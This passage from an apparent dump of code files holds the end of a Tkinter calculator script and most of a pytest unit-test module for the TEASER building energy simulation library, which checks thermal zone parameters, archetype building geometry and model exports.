calc_entry.get().rfind(\"+\")\n        x2 = calc_entry.get().rfind(\"-\")\n        x3 = calc_entry.get().rfind(\"*\")\n        x4 = calc_entry.get().rfind(\"/\")\n        x = max(x1, x2, x3, x4)\n        if x == -1:\n            x = 0\n        if (calc_entry.get()[x:] != \"\"):\n            if key not in calc_entry.get()[x:]:\n                calc_entry.insert(END, key)\n                rav = False\n    else:\n        if not rav:\n            calc_entry.insert(END, key)\n        else:\n            calc_entry.delete(0, END)\n            calc_entry.insert(END, key)\n            rav = False\n\n#\u0441\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0441\u0435 \u043a\u043d\u043e\u043f\u043a\u0438\nbttn_list = [\n         \"M\", \"M+\", \"M-\", \"MC\",\n         \"7\", \"8\", \"9\", \"+\", \"-\",\n         \"4\", \"5\", \"6\", \"*\", \"/\",\n         \"1\", \"2\", \"3\", \"-/+\", \"=\",\n         \"0\", \".\", \"C\", \"del\"\n             ]\n\nr = 1\nc = 1\n\nfor i in bttn_list:\n    action =  lambda x = i: calc(x)\n    if i == '=':\n        ttk.Button = Button(root, text = i, command = action, bg = '#a3b8cf', width = 10, height = 7, bd = 3) \n        ttk.Button.grid(row = r, column = c, rowspan = 2)      \n    else:\n        ttk.Button = Button(root, text = i, command = action, bg = '#a3b8cf', width = 10, height = 3, bd = 3) \n        ttk.Button.grid(row = r, column = c)\n    c += 1\n    if c > 4:\n        c = 0\n        r += 1\n\ncalc_entry = Entry(root, width = 40, bd = 5, font = 10, justify = RIGHT)\ncalc_entry.grid(row = 0, column = 0, columnspan = 5)\n#\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438\nmemory_label = Label(root, text = \"M: 0\", width = 10)\nmemory_label.grid(row = 1, column = 0)\n#im = PhotoImage(file='Tree1.gif')\n#memory_label.image = im\nroot.mainloop()\n", "402": "\"\"\"\nCreated July 2015\n\n@author: TEASER 4 Development Team\n\"\"\"\n\nfrom teaser.logic import utilities\nfrom teaser.project import Project\nimport math\nimport os\nimport helptest\nimport warnings as warnings\n\nprj = Project(True)\n\n\nclass Test_teaser(object):\n    \"\"\"Unit Tests for TEASER\"\"\"\n\n    global prj\n\n    def test_calc_vdi_room1(self):\n        \"\"\"Parameter Verification for rouvel room1\"\"\"\n        import teaser.examples.verification.verification_VDI_6007_room1 as room1\n\n        room1_prj = room1.parameter_room1()\n        zone_attr = room1_prj.buildings[0].thermal_zones[0].model_attr\n\n        # parameters inner wall Typraum S\n\n        assert round(zone_attr.r1_iw, 13) == 0.0005956934075\n        assert round(zone_attr.c1_iw / 1000, 7) == 14836.3546282\n        assert round(zone_attr.area_iw, 1) == 75.5\n        assert round(zone_attr.alpha_conv_inner_iw, 13) == 2.23642384105960\n\n        # paremeters outer wall Typraum S\n        r_rest = zone_attr.r_rest_ow + 1 / (\n            zone_attr.alpha_comb_outer_ow * zone_attr.area_ow\n        )\n        assert round(r_rest, 13) == 0.0427687193786\n        assert round(zone_attr.r1_ow, 13) == 0.0043679129367\n        assert round(zone_attr.c1_ow / 1000, 7) == 1600.8489399\n        assert round(zone_attr.area_ow, 1) == 3.5\n        assert round(zone_attr.area_win, 1) == 7.0\n        assert round(zone_attr.alpha_conv_inner_ow, 1) == 2.7\n        assert round(zone_attr.alpha_comb_outer_ow, 1) == 25.0\n\n    def test_calc_vdi_room3(self):\n        \"\"\"Parameter Verification for room 3\"\"\"\n        import teaser.examples.verification.verification_VDI_6007_room3 as room3\n\n        room3_prj = room3.parameter_room3()\n        zone_attr = room3_prj.buildings[0].thermal_zones[0].model_attr\n\n        # parameters inner wall Typraum L\n\n        assert round(zone_attr.r1_iw, 13) == 0.003385649748\n        assert round(zone_attr.c1_iw / 1000, 7) == 7445.3648976\n        assert round(zone_attr.area_iw, 1) == 75.5\n        assert round(zone_attr.alpha_conv_inner_iw, 13) == 2.23642384105960\n\n        # parameters outer wall Typraum L\n        r_rest = zone_attr.r_rest_ow + 1 / (\n            zone_attr.alpha_comb_outer_ow * zone_attr.area_ow\n        )\n        assert round(r_rest, 13) == 0.0431403889233\n        assert round(zone_attr.r1_ow, 13) == 0.004049351608\n        assert round(zone_attr.c1_ow / 1000, 7) == 47.8617641\n        assert round(zone_attr.area_ow, 1) == 3.5\n        assert round(zone_attr.area_win, 1) == 7.0\n        assert round(zone_attr.alpha_conv_inner_ow, 1) == 2.7\n        assert round(zone_attr.alpha_comb_outer_ow, 1) == 25.0\n\n    def test_calc_vdi_room8(self):\n        \"\"\"Parameter Verification for room 8\"\"\"\n        import teaser.examples.verification.verification_VDI_6007_room8 as room8\n\n        room8_prj = room8.parameter_room8()\n        zone_attr = room8_prj.buildings[0].thermal_zones[0].model_attr\n\n        assert round(zone_attr.r1_iw, 13) == 0.0006688956391\n        assert round(zone_attr.c1_iw / 1000, 7) == 12391.3638631\n        assert round(zone_attr.area_iw, 1) == 60.5\n        assert round(zone_attr.alpha_conv_inner_iw, 13) == 2.1214876033058\n        r_rest = zone_attr.r_rest_ow + 1 / (\n            zone_attr.alpha_comb_outer_ow * zone_attr.area_ow\n        )\n        assert round(r_rest, 13) == 0.0207059264866\n        assert round(zone_attr.r1_ow, 13) == 0.0017362530106\n        assert round(zone_attr.c1_ow / 1000, 7) == 5259.932231\n        assert round(zone_attr.area_ow, 1) == 11.5\n        assert round(zone_attr.area_win, 1) == 14.0\n        assert round(zone_attr.alpha_conv_inner_ow, 1) == 2.7\n        assert round(zone_attr.alpha_comb_outer_ow, 1) == 25.0\n        assert round(zone_attr.weightfactor_ow[1], 13) == 0.1324989973869\n        assert round(zone_attr.weightfactor_win[0], 13) == 0.4047663456282\n\n    # EBC Calculation Verification, with parameters from TEASER3\n\n    def test_calc_ebc(self):\n        \"\"\"\n        Parameter Verification for ebc calculation method. Values are compared\n        with TEASER3 values.\n        \"\"\"\n        prj.set_default()\n        prj.load_project(\n            utilities.get_full_path(\"examples/examplefiles/unitTestCalc.json\")\n        )\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.buildings[0].calc_building_parameter()\n        zone_attr = prj.buildings[0].thermal_zones[0].model_attr\n\n        assert round(zone_attr.r1_iw, 11) == 4.62113e-06\n        assert round(zone_attr.c1_iw, 2) == 1209810287.22\n        assert round(zone_attr.area_iw, 5) == 9866.66667\n        assert round(zone_attr.alpha_conv_inner_iw, 5) == 2.37568\n\n        assert round(zone_attr.r_rest_ow, 5) == 0.00181\n        assert round(zone_attr.r1_ow, 10) == 3.06155e-05\n        assert round(zone_attr.c1_ow, 3) == 226923157.846\n        assert round(zone_attr.area_ow, 5) == 920.0\n\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 1.83043\n\n        assert round(zone_attr.alpha_conv_outer_ow, 5) == 20.0\n        assert round(zone_attr.alpha_comb_outer_ow, 5) == 25.0\n        assert round(zone_attr.alpha_conv_inner_win, 5) == 2.7\n        assert round(zone_attr.alpha_conv_outer_win, 5) == 20.0\n        assert round(zone_attr.alpha_comb_outer_win, 5) == 25.0\n\n        assert round(zone_attr.weightfactor_ow[0], 5) == 0.04588\n        assert round(zone_attr.weightfactor_win[0], 5) == 0.33333\n        assert round(zone_attr.weightfactor_ground, 5) == 0.54398\n\n    def test_type_bldg_office_with_calc(self):\n        \"\"\"\n        Verification of the type building generation of an office building.\n        Values are compared with TEASER3 values.\n        \"\"\"\n        from teaser.logic.archetypebuildings.bmvbs.office import Office\n\n        prj.set_default()\n        test_office = Office(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n        )\n\n        test_office.generate_archetype()\n\n        # general parameters\n\n        assert len(test_office.thermal_zones) == 6\n\n        # zone specific parameters\n\n        for zone in test_office.thermal_zones:\n            if zone.name == \"Meeting\":\n                assert zone.area == 100\n            if zone.name == \"Storage\":\n                assert zone.area == 375\n            if zone.name == \"Office\":\n                assert zone.area == 1250\n            if zone.name == \"Restroom\":\n                assert zone.area == 100\n            if zone.name == \"ICT\":\n                assert zone.area == 50\n            if zone.name == \"Floor\":\n                assert zone.area == 625\n\n        # facade specific parameters\n\n        assert round(test_office.get_outer_wall_area(-2), 0) == 958\n        assert round(test_office.get_outer_wall_area(-1), 0) == 958\n        assert round(test_office.get_outer_wall_area(0), 0) == 437\n        assert round(test_office.get_outer_wall_area(180), 0) == 437\n        assert round(test_office.get_outer_wall_area(90), 0) == 77\n        assert round(test_office.get_outer_wall_area(270), 0) == 77\n        assert round(test_office.get_window_area(0), 0) == 158\n        assert round(test_office.get_window_area(180), 0) == 158\n        assert round(test_office.get_window_area(90), 0) == 28\n        assert round(test_office.get_window_area(270), 0) == 28\n\n        prj.set_default()\n        test_office = Office(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            office_layout=1,\n            window_layout=1,\n            construction_type=\"light\",\n        )\n\n        test_office.generate_archetype()\n\n        # facade specific parameters\n\n        assert round(test_office.get_outer_wall_area(-2), 0) == 958\n        assert round(test_office.get_outer_wall_area(-1), 0) == 958\n        assert round(test_office.get_outer_wall_area(0), 0) == 446\n        assert round(test_office.get_outer_wall_area(180), 0) == 446\n        assert round(test_office.get_outer_wall_area(90), 0) == 79\n        assert round(test_office.get_outer_wall_area(270), 0) == 79\n        assert round(test_office.get_window_area(0), 0) == 149\n        assert round(test_office.get_window_area(180), 0) == 149\n        assert round(test_office.get_window_area(90), 0) == 26\n        assert round(test_office.get_window_area(270), 0) == 26\n\n        prj.set_default()\n        test_office = Office(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            office_layout=2,\n            window_layout=2,\n            construction_type=\"heavy\",\n        )\n\n        test_office.generate_archetype()\n\n        # facade specific parameters\n\n        assert round(test_office.get_outer_wall_area(-2), 0) == 958\n        assert round(test_office.get_outer_wall_area(-1), 0) == 958\n        assert round(test_office.get_outer_wall_area(0), 0) == 283\n        assert round(test_office.get_outer_wall_area(180), 0) == 283\n        assert round(test_office.get_outer_wall_area(90), 0) == 67\n        assert round(test_office.get_outer_wall_area(270), 0) == 67\n        assert round(test_office.get_window_area(0), 0) == 283\n        assert round(test_office.get_window_area(180), 0) == 283\n        assert round(test_office.get_window_area(90), 0) == 67\n        assert round(test_office.get_window_area(270), 0) == 67\n\n        prj.set_default()\n        test_office = Office(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            office_layout=3,\n            window_layout=3,\n            construction_type=\"light\",\n        )\n\n        test_office.generate_archetype()\n\n        # facade specific parameters\n\n        assert round(test_office.get_outer_wall_area(-2), 0) == 958\n        assert round(test_office.get_outer_wall_area(-1), 0) == 958\n        assert round(test_office.get_outer_wall_area(0), 0) == 35\n        assert round(test_office.get_outer_wall_area(180), 0) == 35\n        assert round(test_office.get_outer_wall_area(90), 0) == 35\n        assert round(test_office.get_outer_wall_area(270), 0) == 35\n        assert round(test_office.get_window_area(0), 0) == 315\n        assert round(test_office.get_window_area(180), 0) == 315\n        assert round(test_office.get_window_area(90), 0) == 315\n        assert round(test_office.get_window_area(270), 0) == 315\n\n    def test_type_bldg_institute4_with_calc(self):\n        \"\"\"\n        Verification of the type building generation of an office building.\n        Values are compared with TEASER3 values.\n        \"\"\"\n        from teaser.logic.archetypebuildings.bmvbs.custom.institute4 import Institute4\n\n        prj.set_default()\n        test_institute4 = Institute4(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n\n        test_institute4.generate_archetype()\n\n        # general parameters\n\n        assert len(test_institute4.thermal_zones) == 7\n\n        # zone specific parameters\n\n        for zone in test_institute4.thermal_zones:\n            if zone.name == \"Meeting\":\n                assert zone.area == 100\n            if zone.name == \"Storage\":\n                assert round(zone.area) == 700\n            if zone.name == \"Office\":\n                assert zone.area == 550\n            if zone.name == \"Restroom\":\n                assert zone.area == 100\n            if zone.name == \"ICT\":\n                assert zone.area == 50\n            if zone.name == \"Floor\":\n                assert zone.area == 500\n            if zone.name == \"Laboratory\":\n                assert zone.area == 500\n\n        # facade specific parameters\n\n        assert round(test_institute4.get_outer_wall_area(-2), 0) == 958\n        assert round(test_institute4.get_outer_wall_area(-1), 0) == 958\n        assert round(test_institute4.get_outer_wall_area(0), 0) == 742\n        assert round(test_institute4.get_outer_wall_area(180), 0) == 742\n        assert round(test_institute4.get_outer_wall_area(90), 0) == 131\n        assert round(test_institute4.get_outer_wall_area(270), 0) == 131\n        assert round(test_institute4.get_window_area(0), 0) == 158\n        assert round(test_institute4.get_window_area(180), 0) == 158\n        assert round(test_institute4.get_window_area(90), 0) == 28\n        assert round(test_institute4.get_window_area(270), 0) == 28\n\n    def test_type_bldg_institute8_with_calc(self):\n        \"\"\"\n        Verification of the type building generation of an office building.\n        Values are compared with TEASER3 values.\n        \"\"\"\n        from teaser.logic.archetypebuildings.bmvbs.custom.institute8 import Institute8\n\n        prj.set_default()\n        test_institute8 = Institute8(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n\n        test_institute8.generate_archetype()\n\n        # general parameters\n\n        assert len(test_institute8.thermal_zones) == 7\n\n        # zone specific parameters\n\n        for zone in test_institute8.thermal_zones:\n            if zone.name == \"Meeting\":\n                assert zone.area == 100\n            if zone.name == \"Storage\":\n                assert zone.area == 750\n            if zone.name == \"Office\":\n                assert zone.area == 100\n            if zone.name == \"Restroom\":\n                assert zone.area == 100\n            if zone.name == \"ICT\":\n                assert zone.area == 50\n            if zone.name == \"Floor\":\n                assert zone.area == 150\n            if zone.name == \"Laboratory\":\n                assert zone.area == 1250\n\n        # facade specific parameters\n\n        assert round(test_institute8.get_outer_wall_area(-2), 0) == 958\n        assert round(test_institute8.get_outer_wall_area(-1), 0) == 958\n        assert round(test_institute8.get_outer_wall_area(0), 0) == 742\n        assert round(test_institute8.get_outer_wall_area(180), 0) == 742\n        assert round(test_institute8.get_outer_wall_area(90), 0) == 131\n        assert round(test_institute8.get_outer_wall_area(270), 0) == 131\n        assert round(test_institute8.get_window_area(0), 0) == 158\n        assert round(test_institute8.get_window_area(180), 0) == 158\n        assert round(test_institute8.get_window_area(90), 0) == 28\n        assert round(test_institute8.get_window_area(270), 0) == 28\n\n    def test_type_bldg_institute_with_calc(self):\n        \"\"\"\n        Verification of the type building generation of an office building.\n        Values are compared with TEASER3 values.\n        \"\"\"\n        from teaser.logic.archetypebuildings.bmvbs.custom.institute import Institute\n\n        prj.set_default()\n        test_institute = Institute(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n\n        test_institute.generate_archetype()\n\n        # general parameters\n\n        assert len(test_institute.thermal_zones) == 7\n\n        # zone specific parameters\n\n        for zone in test_institute.thermal_zones:\n            if zone.name == \"Meeting\":\n                assert zone.area == 100\n            if zone.name == \"Storage\":\n                assert zone.area == 1000\n            if zone.name == \"Office\":\n                assert zone.area == 400\n            if zone.name == \"Restroom\":\n                assert zone.area == 100\n            if zone.name == \"ICT\":\n                assert zone.area == 50\n            if zone.name == \"Floor\":\n                assert zone.area == 475\n            if zone.name == \"Laboratory\":\n                assert zone.area == 375\n\n        # facade specific parameters\n\n        assert round(test_institute.get_outer_wall_area(-2), 0) == 958\n        assert round(test_institute.get_outer_wall_area(-1), 0) == 958\n        assert round(test_institute.get_outer_wall_area(0), 0) == 836\n        assert round(test_institute.get_outer_wall_area(180), 0) == 836\n        assert round(test_institute.get_outer_wall_area(90), 0) == 147\n        assert round(test_institute.get_outer_wall_area(270), 0) == 147\n        assert round(test_institute.get_window_area(0), 0) == 158\n        assert round(test_institute.get_window_area(180), 0) == 158\n        assert round(test_institute.get_window_area(90), 0) == 28\n        assert round(test_institute.get_window_area(270), 0) == 28\n\n    def test_type_bldg_residential_with_calc(self):\n        \"\"\"\n        Verification of the type building generation of an office building.\n        Values are compared with TEASER3 values.\n        \"\"\"\n        from teaser.logic.archetypebuildings.bmvbs.singlefamilydwelling import (\n            SingleFamilyDwelling,\n        )\n\n        prj.set_default()\n        test_residential = SingleFamilyDwelling(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n        )\n\n        test_residential.generate_archetype()\n\n        # general parameters\n\n        assert len(test_residential.thermal_zones) == 1\n\n        # zone specific parameters\n\n        for zone in test_residential.thermal_zones:\n            if zone.name == \"SingleDwelling\":\n                assert zone.area == 2500\n\n        # facade specific parameters\n\n        assert round(test_residential.get_outer_wall_area(-2), 0) == 1108\n        assert round(test_residential.get_outer_wall_area(-1), 0) == 1108\n        assert round(test_residential.get_outer_wall_area(0), 0) == 312\n        assert round(test_residential.get_outer_wall_area(180), 0) == 312\n        assert round(test_residential.get_outer_wall_area(90), 0) == 312\n        assert round(test_residential.get_outer_wall_area(270), 0) == 312\n        assert round(test_residential.get_window_area(0), 0) == 125\n        assert round(test_residential.get_window_area(180), 0) == 125\n        assert round(test_residential.get_window_area(90), 0) == 125\n        assert round(test_residential.get_window_area(270), 0) == 125\n\n        prj.set_default()\n        test_residential = SingleFamilyDwelling(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            residential_layout=1,\n            neighbour_buildings=1,\n            attic=1,\n            dormer=1,\n            cellar=1,\n            construction_type=\"light\",\n        )\n\n        test_residential.generate_archetype()\n\n        # facade specific parameters\n\n        assert round(test_residential.get_outer_wall_area(-2), 0) == 1108\n        assert round(test_residential.get_outer_wall_area(-1), 0) == 1108\n        assert round(test_residential.get_outer_wall_area(0), 0) == 393\n        assert round(test_residential.get_outer_wall_area(180), 0) == 393\n        assert round(test_residential.get_outer_wall_area(90), 0) == 393\n        assert round(test_residential.get_outer_wall_area(270), 0) == 393\n        assert round(test_residential.get_window_area(0), 0) == 125\n        assert round(test_residential.get_window_area(180), 0) == 125\n        assert round(test_residential.get_window_area(90), 0) == 125\n        assert round(test_residential.get_window_area(270), 0) == 125\n\n        prj.set_default()\n        test_residential = SingleFamilyDwelling(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            residential_layout=0,\n            neighbour_buildings=2,\n            attic=2,\n            dormer=0,\n            cellar=2,\n            construction_type=\"heavy\",\n        )\n\n        test_residential.generate_archetype()\n\n        # facade specific parameters\n\n        assert round(test_residential.get_outer_wall_area(-2), 0) == 858\n        assert round(test_residential.get_outer_wall_area(-1), 0) == 484\n        assert round(test_residential.get_outer_wall_area(0), 0) == 267\n        assert round(test_residential.get_outer_wall_area(180), 0) == 267\n        assert round(test_residential.get_outer_wall_area(90), 0) == 267\n        assert round(test_residential.get_outer_wall_area(270), 0) == 267\n        assert round(test_residential.get_window_area(0), 0) == 125\n        assert round(test_residential.get_window_area(180), 0) == 125\n        assert round(test_residential.get_window_area(90), 0) == 125\n        assert round(test_residential.get_window_area(270), 0) == 125\n\n        prj.set_default()\n        test_residential = SingleFamilyDwelling(\n            parent=prj,\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=3,\n            height_of_floors=3,\n            net_leased_area=2500,\n            residential_layout=0,\n            neighbour_buildings=2,\n            attic=3,\n            dormer=0,\n            cellar=3,\n            construction_type=\"light\",\n        )\n\n        test_residential.generate_archetype()\n\n        # facade specific parameters\n\n        assert round(test_residential.get_outer_wall_area(-2), 0) == 700\n        assert round(test_residential.get_outer_wall_area(-1), 0) == 789\n        assert round(test_residential.get_outer_wall_area(0), 0) == 251\n        assert round(test_residential.get_outer_wall_area(180), 0) == 251\n        assert round(test_residential.get_outer_wall_area(90), 0) == 251\n        assert round(test_residential.get_outer_wall_area(270), 0) == 251\n        assert round(test_residential.get_window_area(0), 0) == 125\n        assert round(test_residential.get_window_area(180), 0) == 125\n        assert round(test_residential.get_window_area(90), 0) == 125\n        assert round(test_residential.get_window_area(270), 0) == 125\n\n    # # methods in Project, these tests only test if the API function works,\n    # # not if it produces reliable results.\n\n    def test_load_save_project(self):\n        \"\"\"test of load_project and save_project\"\"\"\n\n        prj.load_project(\n            utilities.get_full_path((\"examples/examplefiles\" \"/unitTest.json\"))\n        )\n        therm_zone = prj.buildings[-1].thermal_zones[0]\n        assert round(therm_zone.outer_walls[0].area, 2) == 137.23\n        tz_area = sum([tz.area for tz in prj.buildings[-1].thermal_zones])\n        assert prj.buildings[-1].net_leased_area == tz_area\n        prj.save_project(file_name=\"unitTest\", path=None)\n        prj.save_project(file_name=None, path=utilities.get_default_path())\n        prj.set_default()\n\n    def test_load_save_project_new(self):\n        \"\"\"test of load_project and save_project\"\"\"\n        prj.set_default(load_data=True)\n        prj.load_project(os.path.join(utilities.get_default_path(), \"unitTest.json\"))\n        therm_zone = prj.buildings[-1].thermal_zones[0]\n        assert therm_zone.area == 994.0\n        tz_area = sum([tz.area for tz in prj.buildings[-1].thermal_zones])\n        for tz in prj.buildings[-1].thermal_zones:\n            print(tz.name, tz.area)\n        print(prj.buildings[-1].name, prj.buildings[-1].net_leased_area)\n        assert prj.buildings[-1].net_leased_area == tz_area\n        assert prj.buildings[-1].net_leased_area == 1988.0\n        assert prj.buildings[-1].name == \"TestBuilding\"\n        prj.name = \"Project\"\n        prj.save_project(file_name=\"unitTest_new.json\", path=None)\n\n    def test_calc_all_buildings(self):\n        \"\"\"test of calc_all_buildings, no calculation verification\"\"\"\n\n        helptest.building_test2(prj)\n        helptest.building_test2(prj)\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings(raise_errors=True)\n\n    def test_retrofit_all_buildings(self):\n        \"\"\"test of retrofit_all_buildings, no calculation verification\"\"\"\n        prj.add_residential(\n            method=\"iwu\",\n            usage=\"single_family_dwelling\",\n            name=\"ResidentialBuilding\",\n            year_of_construction=1858,\n            number_of_floors=2,\n            height_of_floors=3.2,\n            net_leased_area=219,\n        )\n        prj.add_residential(\n            method=\"tabula_de\",\n            usage=\"single_family_house\",\n            name=\"ResidentialBuilding\",\n            year_of_construction=1858,\n            number_of_floors=2,\n            height_of_floors=3.2,\n            net_leased_area=219,\n        )\n        prj.retrofit_all_buildings(year_of_retrofit=2015, type_of_retrofit=\"retrofit\")\n\n    def test_export_aixlib(self):\n        \"\"\"test of export_aixlib, no calculation verification\"\"\"\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib(building_model=\"Test\", zone_model=\"Test\", corG=\"Test\")\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.buildings.append(prj.buildings[-1])\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib(path=utilities.get_default_path())\n\n    def test_export_ibpsa(self):\n        \"\"\"test of export_ibpsa, no calculation verification\"\"\"\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(library=\"AixLib\")\n        prj.export_ibpsa(library=\"Buildings\")\n        prj.export_ibpsa(library=\"BuildingSystems\")\n        prj.export_ibpsa(library=\"IDEAS\")\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(internal_id=prj.buildings[-1].internal_id)\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(path=utilities.get_default_path())\n        prj.set_default()\n\n    def test_instantiate_data_class(self):\n        \"\"\"test of instantiate_data_class\"\"\"\n\n        prj.instantiate_data_class()\n\n    def test_type_bldg_office(self):\n        \"\"\"test of type_bldg_office, no calculation verification\n        \"\"\"\n        prj.set_default(load_data=True)\n\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"office\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"office\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            internal_gains_mode=2,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"office\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            internal_gains_mode=3,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n\n    def test_type_bldg_institute(self):\n        \"\"\"test of type_bldg_institute, no calculation verification\"\"\"\n\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"institute\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=True,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"institute\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=False,\n            internal_gains_mode=2,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n        prj.add_non_residential(\n            